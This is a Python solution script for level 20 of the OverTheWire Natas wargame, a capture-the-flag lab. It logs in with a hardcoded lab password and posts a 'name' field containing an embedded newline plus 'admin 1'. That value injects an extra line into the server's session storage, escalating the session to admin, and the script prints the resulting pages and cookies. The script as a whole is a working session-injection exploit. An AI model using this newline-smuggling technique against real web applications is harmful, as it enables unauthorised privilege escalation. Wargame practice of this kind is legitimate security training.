import requests
import re
from string import *
import time
import sys
import codecs

characters = "abcdefghijkjmnopqrstuvwyxzABCDEFGHIJKLMNOPQRSTUVWYXZ0123456789"

for a in range(1):
    logar = ["natas20","eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF"]
    url = "http://%s.natas.labs.overthewire.org/?debug=True"%logar[0]
    session = requests.Session()
    r = session.post(url ,data={}, auth=(logar[0],logar[1]), timeout=10)
    contento = r.text
    print(contento)
    print(session.cookies)

    print("="*80)
    #important part
    r = session.post(url ,data={"name":"aadmin\nadmin  1"}, auth=(logar[0],logar[1]), timeout=10)
    contento = r.text
    print(contento)
    print(session.cookies)

    print("="*80)

    r = session.post(url ,data={"name":""}, auth=(logar[0],logar[1]), timeout=10)
    contento = r.text
    print(contento)
    print(session.cookies)
